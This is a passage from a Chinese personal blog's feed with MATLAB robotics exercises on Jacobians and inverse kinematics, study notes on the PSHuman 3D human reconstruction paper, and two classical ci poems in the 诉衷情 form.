class="hljs-string">&#x27;$\theta_1$&#x27;</span>,<span class="hljs-string">&#x27;$\theta_2$&#x27;</span>,<span class="hljs-string">&#x27;$\theta_3$&#x27;</span>, ...<br>    <span class="hljs-string">&#x27;Interpreter&#x27;</span>,<span class="hljs-string">&#x27;latex&#x27;</span>)<br><br><span class="hljs-built_in">figure</span><br><span class="hljs-built_in">plot</span>(t,X_list)<br>title(<span class="hljs-string">&#x27;3个笛卡尔分量与时间的关系&#x27;</span>)<br>grid on<br>xlabel(<span class="hljs-string">&#x27;t/s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;笛卡尔分量&#x27;</span>)<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;$x/m$&#x27;</span>,<span class="hljs-string">&#x27;$y/m$&#x27;</span>,<span class="hljs-string">&#x27;$\phi/rad $&#x27;</span>, ...<br>    <span class="hljs-string">&#x27;Interpreter&#x27;</span>,<span class="hljs-string">&#x27;latex&#x27;</span>)<br><br><span class="hljs-built_in">figure</span><br><span class="hljs-built_in">plot</span>(t,J_det_list)<br>title(<span class="hljs-string">&#x27;雅可比矩阵行列式与时间的关系&#x27;</span>)<br>grid on<br>xlabel(<span class="hljs-string">&#x27;t/s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;$\left | J \right | $&#x27;</span>,<span class="hljs-string">&#x27;Interpreter&#x27;</span>,<span class="hljs-string">&#x27;latex&#x27;</span>)<br><br><span class="hljs-built_in">figure</span><br><span class="hljs-built_in">plot</span>(t,T_list)<br>title(<span class="hljs-string">&#x27;3个活动关节力矩与时间的关系&#x27;</span>)<br>grid on<br>xlabel(<span class="hljs-string">&#x27;t/s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;$T/(N\cdot m)$&#x27;</span>,<span class="hljs-string">&#x27;Interpreter&#x27;</span>,<span class="hljs-string">&#x27;latex&#x27;</span>)<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;$\tau_1$&#x27;</span>,<span class="hljs-string">&#x27;$\tau_2$&#x27;</span>,<span class="hljs-string">&#x27;$\tau_3$&#x27;</span>, ...<br>    <span class="hljs-string">&#x27;Interpreter&#x27;</span>,<span class="hljs-string">&#x27;latex&#x27;</span>)<br><br><span class="hljs-comment">% 机器人工具箱的动画仿真</span><br><span class="hljs-built_in">figure</span><br>bot.<span class="hljs-built_in">plot</span>(deg2rad(Theta_list)&#x27;,<span class="hljs-string">&#x27;view&#x27;</span>,<span class="hljs-string">&#x27;top&#x27;</span>,<span class="hljs-string">&#x27;movie&#x27;</span>,<span class="hljs-string">&#x27;rob.mp4&#x27;</span>)<br><br><br><span class="hljs-comment">% 2)</span><br>clear;clc;<br><span class="hljs-comment">%机器人工具箱</span><br>L(<span class="hljs-number">1</span>)=Link(<span class="hljs-string">&#x27;alpha&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">2</span>)=Link(<span class="hljs-string">&#x27;alpha&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">3</span>)=Link(<span class="hljs-string">&#x27;alpha&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;modified&#x27;</span>);<br>bot=SerialLink(L,<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;robot&#x27;</span>,<span class="hljs-string">&#x27;tool&#x27;</span>,[<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]);<br><span class="hljs-comment">%初始关节角</span><br>Theta_0s=deg2rad([<span class="hljs-number">10</span>;<span class="hljs-number">20</span>;<span class="hljs-number">30</span>]);<br><span class="hljs-comment">%5秒仿真中最后的关节角，由上题结果中Theta_list的最后一项复制而来</span><br>Theta_5s=deg2rad([<span class="hljs-number">11.8810745317428</span>;<span class="hljs-number">18.0197158094528</span>;<span class="hljs-number">-27.1965698542779</span>]);<br><span class="hljs-comment">%两组关节角的雅可比矩阵</span><br>j0_0s=bot.jacob0(Theta_0s&#x27;);<br>j0_0s([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>],:)<br>j0_5s=bot.jacob0(Theta_5s&#x27;);<br>j0_5s([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>],:)<br></code></pre></td></tr></table></figure><h2 id="结果">结果</h2><p><imgsrc="/img/robotics-section-5-jacobian-matlab-practice/result1.png"alt="result1" /> <imgsrc="/img/robotics-section-5-jacobian-matlab-practice/result2.png"alt="result2" /> <imgsrc="/img/robotics-section-5-jacobian-matlab-practice/result3.png"alt="result3" /> <imgsrc="/img/robotics-section-5-jacobian-matlab-practice/result4.png"alt="result4" /> <imgsrc="/img/robotics-section-5-jacobian-matlab-practice/result5.png"alt="result5" /> <imgsrc="/img/robotics-section-5-jacobian-matlab-practice/result6.png"alt="result6" /></p>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PSHuman Learning</title>
    <link href="/2025/05/26/PSHuman-Learning/"/>
    <url>/2025/05/26/PSHuman-Learning/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="pshuman-learning">PSHuman Learning</h2><h2 id="前置知识">1 前置知识</h2><h2 id="核心过程">2 核心过程</h2><h3 id="基于smpl-x先验条件的跨尺度多视角扩散生成">2.1基于SMPL-X先验条件的跨尺度多视角扩散生成</h3><p>这一阶段的目标是根据输入的单张图像，生成高质量、多视角（6个视图：前、左前、左、后、右、右前）的彩色图和法线图，同时要确保一致性。</p><figure><img src="/img/PSHuman-Learning/overall_pipeline.png"alt="overall_pipeline" /><figcaption aria-hidden="true">overall_pipeline</figcaption></figure><h4 id="条件扩散模型">2.1.1 条件扩散模型</h4><p>采用U-Net结构地神经网络作为去噪网络。U-Net地编码器-编码器结构及其跳跃连接非常适合图像到图像地转换任务，能够捕捉不同尺度地特征，生成多视角图像。</p><h5 id="训练">训练</h5><ul><li>数据准备：3d人体模型数据对。对于每个3d人体模型，从多个预设视点渲染其彩色图和法线图。<br /></li><li>前向扩散：对训练集中地多视角图像进行逐步加噪过程，得到不同时间步t地噪声版本<spanclass="math inline">\(x_t\)</span>。<br /></li><li>反向去噪：训练去噪网络<span class="math inline">\(\epsilon(x_t, t,cond)\)</span>来预测在时间t添加到<spanclass="math inline">\(x_{t-1}\)</span>上的噪声<spanclass="math inline">\(\epsilon\)</span>，其中condi是条件信息。</li></ul><h5 id="条件注入">条件注入</h5><p>条件注入是引导扩散模型生成特定内容的关键，PSHuman中条件cond主要包括：<br />1. 输入图像<spanclass="math inline">\(I_{in}\)</span>：全局信息，通过预训练的图像编码器提取特征。<br />2. 目标视点<spanclass="math inline">\(v_i\)</span>：指定模型当前要生成的视图的角度，是一个类别标签（例如“左视图”）。<br />3. SMPL-X先验：1）估计：首先，从输入图像<spanclass="math inline">\(I_{in}\)</span>中使用已有的SMPL-X参数估计算法（如PIXIE，SPIN，CLIFF等）得到姿态参数<spanclass="math inline">\(\theta_{smplx}\)</span>和形状参数<spanclass="math inline">\(\beta_{smplx}\)</span>。2）渲染：使用这些参数渲染出该SMPL-X模型在目标视点<spanclass="math inline">\(v_i\)</span>下的图像。3）编码与注入：将上面生成的SMPL-X渲染图编码(使用VariationalAutoencoder)为特征，并与输入图像特征、视点信息一起注入到U-Net的各个层级。<br />SMPL-X先验极大地缓解了单视图地歧义性，为扩散模型提供了关于人体结构、比例和当前姿态的强约束，有助于生成被遮挡区域和保持跨视图的一致性。<br /><div class="note note-info">            <p>论文中的表述为：The introduction of these conditional signalsconstrains the multiview distribution, leading to more accurate andconsistent human image generation. This approach significantly enhancesthe model’s generalization capability on complex human poses withself-occlusion.</p>          </div></p><h4 id="跨尺度身体-面部扩散">2.1.2 跨尺度身体-面部扩散</h4><p>全身图像中，面部区域像素占比较小，直接用全局模型生成难以保证面部细节和身份特征，容易造成面部失真，人类对于面部改变非常敏感，所以这通常是不可接受的。</p><p>所以将面部信息和全局信息解耦，分别使用单独的扩散模型生成对应图像，并最后想办法将两者结合：<br />- 全局分支：一个扩散模型负责生成整个身体在多个视角的图像。<br />-局部（面部）分支：另一个扩散模型利用裁剪出的面图区域专门负责生成高分辨率的面部图像。</p><p>之后通过噪声混合层结合上面两个分支的信息，在扩散模型的去噪过程中间步骤进行交互：<br />1.在全局分支的UNet中，当处理到某个包含面部区域的特征图时，提取同一时间步t和对于网络深度处局部分支UNet生成的面部潜向量<spanclass="math inline">\(h_F\)</span>。<br />2. 将<spanclass="math inline">\(h_F\)</span>进行适当的缩放和填充（RP函数），使其尺寸与全局分支特征图中面部区域的尺寸对齐。<br />3. 使用一个二值掩码<spanclass="math inline">\(w\)</span>来定位全局分支特征图中的面部区域。<br />4. 将处理后的<span class="math inline">\(h_F\)</span>乘以权重<spanclass="math inline">\(w\)</span>并加权求和到全局分支的面部特征区域特征<spanclass="math inline">\(h_B\)</span>上：<span class="math inline">\(h_B =h_B + w \cdot RP(h_F, s)\)</span><br />这样，局部分支专注于面部，可以生成更精细的集合和纹理，专门处理面部能够更好地保留输入图像中地身份特征。而在特征层面进行融合，而不是图像层面地简单拼接，保证了面部与身体其他部分的平滑过渡和光照、风格的一致性，噪声的混合确保了面部信息能够影响到后续全局视图的生成。</p><p>当所有去噪步骤完成后，两个分支分别输出结果：1）全局分支输出6个视角的全身彩色图<spanclass="math inline">\(c_i^{body}\)</span>和法线图<spanclass="math inline">\(N_i^{body}\)</span>。2）局部分支输出高分辨率的面部彩色图<spanclass="math inline">\(c^{face}\)</span>和法线图<spanclass="math inline">\(N^{face}\)</span>。最终的正面视图的彩色图和法线图以面部分支的结果为主，而其他非正面视图的面部则依赖全局分支通过跨试图注意力从正面传递信息。</p><figure><img src="/img/PSHuman-Learning/denoising_diffusion_block.png"alt="denoising_diffusion_block" /><figcaption aria-hidden="true">denoising_diffusion_block</figcaption></figure><h3 id="smpl-x初始的显式人体雕刻">2.2 SMPL-X初始的显式人体雕刻</h3><p>这一阶段主要利用上面生成的多视角彩色图<spanclass="math inline">\(C_i\)</span>和法线图<spanclass="math inline">\(N_i\)</span>，重建出最终带纹理的3D三角网格M。</p><figure><img src="/img/PSHuman-Learning/curving_module.png"alt="curving_module" /><figcaption aria-hidden="true">curving_module</figcaption></figure><h4 id="基于smpl-x的先验网格">2.2.1 基于SMPL-X的先验网格</h4><p>使用上面从输入图像<spanclass="math inline">\(I_in\)</span>估计得到的SMPL-X参数<spanclass="math inline">\((\theta_{smplx,\beta_{smplx}})\)</span>生成初始的3D人体网格<spanclass="math inline">\(M_{init}\)</span>。在上一阶段生成的多视角图像可能与标准的SMPL-X模型存在轻微的未对齐，所以在正式雕刻前进行对齐，即优化SMPL-X模型的平移t、形状<spanclass="math inline">\(\beta\)</span>和姿态<spanclass="math inline">\(\theta\)</span>参数，使得渲染出的多视角法线图<spanclass="math inline">\(N_i^{hat}\)</span>和轮廓图<spanclass="math inline">\(S_i^{hat}\)</span>与上阶段生成的法线图<spanclass="math inline">\(N_i\)</span>和从<spanclass="math inline">\(N_i\)</span>推断的轮廓图<spanclass="math inline">\(S_i\)</span>之间的差异最小，即<spanclass="math inline">\(t, \beta, \theta = \mathop{\arg \min}\limits_{t,\beta, \theta} \sum w_i(||N_i - N_i^{hat}||_2 + ||S_i -S_i^{hat}||_2)\)</span>。</p><h4 id="基于可微光栅化的几何重网格化">2.2.2基于可微光栅化的几何重网格化</h4><p>在<span class="math inline">\(M_{init}\)</span>对齐后<spanclass="math inline">\(M_{current}\)</span>的基础上，进一步雕刻出衣物褶皱、肌肉形态等精细几何细节。</p><p>迭代优化过程：<br />1. 从每个视点<spanclass="math inline">\(v_i\)</span>，使用可微光栅化器渲染<spanclass="math inline">\(M_{current}\)</span>的法线图<spanclass="math inline">\(N_i^{hat}(M_{current})\)</span>和轮廓图<spanclass="math inline">\(S_i^{hat}(M_{current})\)</span>。<br />2. 计算渲染结果与上一阶段生成的目标法线图<spanclass="math inline">\(N_i\)</span>和轮廓图<spanclass="math inline">\(S_i\)</span>之间的L2损失：<spanclass="math inline">\(Loss_{geo} = \sum {w_i（||N_i -N_i^{hat}(m_{current})||_2 + ||S_i -S_i^{hat}(M_{current})||_2）}\)</span>。<br />3.为了保持网格的平滑性，防止出现不自然的表明，通常会加入一个正则化项，例如顶点发现与其邻近顶点平均发现之间差异的惩罚：<spanclass="math inline">\(Loss_{reg} = \lambda \sum (n_j -n_j^{neig})\)</span>，其中<spanclass="math inline">\(n_j\)</span>是顶点法线，<spanclass="math inline">\(n_j^{neig}\)</span>是邻居法线，<spanclass="math inline">\(\lambda\)</span>是权重。<br />4. 总损失<span class="math inline">\(Loss_{total} = Loss_{geo} +Loss_{reg}\)</span>。<br />5. 计算<span class="math inline">\(Loss_{total}\)</span>相对于<spanclass="math inline">\(M_{current}\)</span>顶点位置<spanclass="math inline">\(V\)</span>的梯度，根据梯度更新顶点位置<spanclass="math inline">\(V\)</span>。<br />6. 重复上述步骤，直到收敛或达到预设的迭代次数。<br />另外在网格优化后，可能存在一些未闭合区域，使用泊松表面重建算法来平滑地填补这些区域；手部细节通常很难完美重建，所以可以使用估计的SMPL-X手部模型替换掉雕刻后的手部。</p><h4 id="外观融合与纹理化">2.2.3 外观融合与纹理化</h4><p>进一步，为优化好的几何网络<spanclass="math inline">\(M_{optimized}\)</span>赋予纹理。</p><p>对每个顶点的颜色，其VC迭代优化过程：<br />1. 对于每个顶点<spanclass="math inline">\(v_i\)</span>，使用可微光栅化器渲染<spanclass="math inline">\(M_{optimized}\)</span>得到彩色图像<spanclass="math inline">\(C_i^{hat}(M_{optimized},VC_{current})\)</span>。<br />2. 计算渲染的彩色图像与2.1生成的目标彩色图像<spanclass="math inline">\(C_i\)</span>之间的L2损失：<spanclass="math inline">\(Loss_{appearance} = \sum w_i ||C_i -C_i^{hat}(M_{optimized}, VC_{current})||_2\)</span>。<br />3. 计算<span class="math inline">\(Loss_{appearance}\)</span>相对于<spanclass="math inline">\(VC_{current}\)</span>的梯度，根据梯度更新顶点颜色VC。<br />4. 重复上述步骤，直到收敛或达到预设的迭代次数。<br />对于从所有六个视图都不可见的区域，它们的颜色信息不能直接从<spanclass="math inline">\(C_i\)</span>中获得，此时利用已确定颜色的可见邻近顶点信息，通过基于KDTree的插值方法，沿表面进行插值，为不可见区域赋予合理的颜色，以确保纹理的完整性和视觉上的连续性。</p><div class="note note-info">            <p>原文的表述为：In the majority of cases, this color fusion pipelinesuffices to generate high-quality appearances. However, certain areasmay remain unobserved from the predefined six viewpoints. Thus, wefinally compute a visibility mask and perform topology-awareinterpolation based on KDTree, ensuring comprehensive texturecoverage.</p>          </div><h2 id="总结">3 总结</h2>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>诉衷情·月痕微冷掩西窗</title>
    <link href="/2025/05/23/%E8%AF%89%E8%A1%B7%E6%83%85%C2%B7%E6%9C%88%E7%97%95%E5%BE%AE%E5%86%B7%E6%8E%A9%E8%A5%BF%E7%AA%97/"/>
    <url>/2025/05/23/%E8%AF%89%E8%A1%B7%E6%83%85%C2%B7%E6%9C%88%E7%97%95%E5%BE%AE%E5%86%B7%E6%8E%A9%E8%A5%BF%E7%AA%97/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>诉衷情·月痕微冷掩西窗</center><center>月痕微冷掩西窗，细雨染红妆。年时与君曾许，随风远，谢华芳。</center><center>杨柳陌，旧斜阳，共谁双？语残斜梦。泪尽魂销，时怨忽狂。</center>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>诉衷情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>robotics section 4 inverse kinematics matlab practice</title>
    <link href="/2025/05/15/robotics-section-4-inverse-kinematics-matlab-practice/"/>
    <url>/2025/05/15/robotics-section-4-inverse-kinematics-matlab-practice/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="robotics-section-4-inverse-kinematics-matlab-practice">roboticssection 4 inverse kinematics matlab practice</h1><h2 id="题目">题目</h2><figure><imgsrc="/img/robotics-section-4-inverse-kinematics-matlab-practice/prob.png"alt="problem" /><figcaption aria-hidden="true">problem</figcaption></figure><h2 id="代码">代码</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%% 输入齐次变量矩阵TH0</span><br>GD = [<span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">9</span><br>      <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>      <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span><br>      <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br><span class="hljs-comment">% GD = [0.5   -0.866 0 7.5373</span><br><span class="hljs-comment">%       0.866  0.6   0 3.9266</span><br><span class="hljs-comment">%       0      0     1 0</span><br><span class="hljs-comment">%       0      0     0 1];</span><br><span class="hljs-comment">% GD = [ 0 1 0 -3</span><br><span class="hljs-comment">%       -1 0 0  2</span><br><span class="hljs-comment">%        0 0 1  0</span><br><span class="hljs-comment">%        0 0 0  1];</span><br><span class="hljs-comment">% GD = [ 0.866 0.5   0 -3.1245</span><br><span class="hljs-comment">%       -0.5   0.866 0  9.1674</span><br><span class="hljs-comment">%        0     0     1  0</span><br><span class="hljs-comment">%        0     0     0  1];</span><br><span class="hljs-comment">%% 定义符号变量</span><br>syms L1 L2 L3 theta1 theta2 theta3 x y c1 s1;<br><span class="hljs-comment">%% 正向运动学</span><br>L(<span class="hljs-number">1</span>) = Link([theta1 <span class="hljs-number">0</span>  <span class="hljs-number">0</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">2</span>) = Link([theta2 <span class="hljs-number">0</span>  <span class="hljs-number">4</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">3</span>) = Link([theta3 <span class="hljs-number">0</span>  <span class="hljs-number">3</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<br>L(<span class="hljs-number">4</span>) = Link([<span class="hljs-number">0</span>      <span class="hljs-number">0</span>  <span class="hljs-number">2</span>  <span class="hljs-number">0</span> <span class="hljs-number">1</span>],<span class="hljs-string">&#x27;modified&#x27;</span>);<span class="hljs-comment">%工具坐标&#123;T&#125;</span><br><span class="hljs-comment">%% 初始化变量</span><br>L1=<span class="hljs-number">4</span>;L2=<span class="hljs-number">3</span>;L3=<span class="hljs-number">2</span>;<br><span class="hljs-comment">%% TH3矩阵</span><br>TH3 = [<span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">2</span><br>       <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>       <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span><br>       <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span>];<br><span class="hljs-comment">% Check input size</span><br><span class="hljs-keyword">if</span> ~<span class="hljs-built_in">isequal</span>(<span class="hljs-built_in">size</span>(GD), [<span class="hljs-number">4</span>,<span class="hljs-number">4</span>])<br>    msg =<span class="hljs-string">&#x27;Wrong input format, must be a 4x4 matrix&#x27;</span>;<br>    error(msg);<br><span class="hljs-keyword">end</span><br>gd = GD*(TH3^<span class="hljs-number">-1</span>);<br><span class="hljs-comment">%% DH parameters</span><br><span class="hljs-comment">%一般需要输入D-H参数，本题无变量，故省略</span><br><span class="hljs-comment">%% Calculating theta2</span><br>x = gd(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>);<br>y = gd(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>);<br>c1 = gd(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>s1 = gd(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>);<br>c2 = (x^<span class="hljs-number">2</span> + y^<span class="hljs-number">2</span> - <span class="hljs-number">4</span>^<span class="hljs-number">2</span> - <span class="hljs-number">3</span>^<span class="hljs-number">2</span>)/(<span class="hljs-number">2</span>*<span class="hljs-number">4</span>*<span class="hljs-number">3</span>);<br><span class="hljs-comment">%Check whether the target exceeds the limit</span><br><span class="hljs-keyword">if</span> c2&lt;<span class="hljs-number">-1</span>||c2&gt;<span class="hljs-number">1</span><br>    msg =<span class="hljs-string">&#x27;the target exceeds the limit&#x27;</span>;<br>    error(msg);<br><span class="hljs-keyword">end</span><br>s2P =  <span class="hljs-built_in">sqrt</span>(<span class="hljs-number">1</span>-c2^<span class="hljs-number">2</span>);<br>s2N = -<span class="hljs-built_in">sqrt</span>(<span class="hljs-number">1</span>-c2^<span class="hljs-number">2</span>);<br>theta2P = <span class="hljs-built_in">atan2</span>(s2P,c2);<br>theta2N = <span class="hljs-built_in">atan2</span>(s2N,c2);<br><span class="hljs-comment">%% Calculating theta1</span><br>k1P = <span class="hljs-number">4</span> + <span class="hljs-number">3</span> * <span class="hljs-built_in">cos</span>(theta2P);<br>k2P = <span class="hljs-number">4</span> * <span class="hljs-built_in">sin</span>(theta2P);<br>theta1P = <span class="hljs-built_in">atan2</span>(y,x) - <span class="hljs-built_in">atan2</span>(k2P,k1P);<br><span class="hljs-comment">%</span><br>k1N = <span class="hljs-number">4</span> + (<span class="hljs-number">3</span> * <span class="hljs-built_in">cos</span>(theta2N));<br>k2N = <span class="hljs-number">4</span> * <span class="hljs-built_in">sin</span>(theta2N);<br>theta1N = <span class="hljs-built_in">atan2</span>(y,x) - <span class="hljs-built_in">atan2</span>(k2N,k1N);<br><span class="hljs-comment">% Calculating theta3</span><br>theta3P = <span class="hljs-built_in">atan2</span>(s1,c1) - theta2P - theta1P;<br>theta3N = <span class="hljs-built_in">atan2</span>(s1,c1) - theta2N - theta1N;<br><span class="hljs-comment">%% Output of result in the form of &#x27;deg&#x27;</span><br>K1P = theta1P*<span class="hljs-number">180</span>/<span class="hljs-built_in">pi</span>;<br>K2P = theta2P*<span class="hljs-number">180</span>/<span class="hljs-built_in">pi</span>;<br>K3P = theta3P*<span class="hljs-number">180</span>/<span class="hljs-built_in">pi</span>;<br>K1N = theta1N*<span class="hljs-number">180</span>/<span class="hljs-built_in">pi</span>;<br>K2N = theta2N*<span class="hljs-number">180</span>/<span class="hljs-built_in">pi</span>;<br>K3N = theta3N*<span class="hljs-number">180</span>/<span class="hljs-built_in">pi</span>;<br>result1 = [K1P,K2P,K3P,<span class="hljs-number">0</span>]<br>result2 = [K1N,K2N,K3N,<span class="hljs-number">0</span>]<br><span class="hljs-comment">%% Recheck</span><br>digits(<span class="hljs-number">4</span>);<span class="hljs-comment">%设置只保留小数点后4位</span><br>T1 = L(<span class="hljs-number">1</span>).A(theta1P)*L(<span class="hljs-number">2</span>).A(theta2P)*L(<span class="hljs-number">3</span>).A(theta3P)*L(<span class="hljs-number">4</span>).A(<span class="hljs-number">0</span>)<span class="hljs-comment">%此时为分数</span><br>T2 = L(<span class="hljs-number">1</span>).A(theta1N)*L(<span class="hljs-number">2</span>).A(theta2N)*L(<span class="hljs-number">3</span>).A(theta3N)*L(<span class="hljs-number">4</span>).A(<span class="hljs-number">0</span>)<br>A1 = vpa(T1)<span class="hljs-comment">%变换为小数输出</span><br>A2 = vpa(T2)<br></code></pre></td></tr></table></figure><h2 id="结果">结果</h2><figure><imgsrc="/img/robotics-section-4-inverse-kinematics-matlab-practice/a.png"alt="result" /><figcaption aria-hidden="true">result</figcaption></figure><figure><imgsrc="/img/robotics-section-4-inverse-kinematics-matlab-practice/b.png"alt="result" /><figcaption aria-hidden="true">result</figcaption></figure><figure><imgsrc="/img/robotics-section-4-inverse-kinematics-matlab-practice/c.png"alt="result" /><figcaption aria-hidden="true">result</figcaption></figure><figure><imgsrc="/img/robotics-section-4-inverse-kinematics-matlab-practice/d.png"alt="result" /><figcaption aria-hidden="true">result</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>诉衷情·心曲寻遍隐遗亡</title>
    <link href="/2025/04/26/%E8%AF%89%E8%A1%B7%E6%83%85%C2%B7%E5%BF%83%E6%9B%B2%E5%AF%BB%E9%81%8D%E9%9A%90%E9%81%97%E4%BA%A1/"/>
    <url>/2025/04/26/%E8%AF%89%E8%A1%B7%E6%83%85%C2%B7%E5%BF%83%E6%9B%B2%E5%AF%BB%E9%81%8D%E9%9A%90%E9%81%97%E4%BA%A1/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>诉衷情·心曲寻遍隐遗亡</center><center>心曲寻遍隐遗亡，欲自暖还凉。几番恨怨谁诉，忍泪敛眉妆。</center><center>疑月堕，惑流光。复成伤。任凭空问，冷送残风，凄雨侵芳。</center>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>诉衷情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>robotics section 4 matlab practice</title>
    <link href="/2025/04/24/robotics-section-4-matlab-practice/"/>
    <url>/2025/04/24/robotics-section-4-matlab-practice/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="robotics-section-4-matlab-practice">robotics section 4 matlabpractice</h1><p>使用matlab robot toolbox工具箱编程求解工作空间</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% 加载内置的 Puma560 模型</span><br>mdl_puma560<br>robot = p560;<br><br><span class="hljs-comment">% 获取每个关节的范围（这里假设是 +-160° 的范围，单位转为弧度）</span><br>q1 = deg2rad(<span class="hljs-built_in">linspace</span>(<span class="hljs-number">-160</span>, <span class="hljs-number">160</span>, <span class="hljs-number">20</span>));<br>q2 = deg2rad(<span class="hljs-built_in">linspace</span>(<span class="hljs-number">-110</span>, <span class="hljs-number">110</span>, <span class="hljs-number">20</span>));<br>q3 = deg2rad(<span class="hljs-built_in">linspace</span>(<span class="hljs-number">-135</span>, <span class="hljs-number">135</span>, <span class="hljs-number">20</span>));<br>q4 = 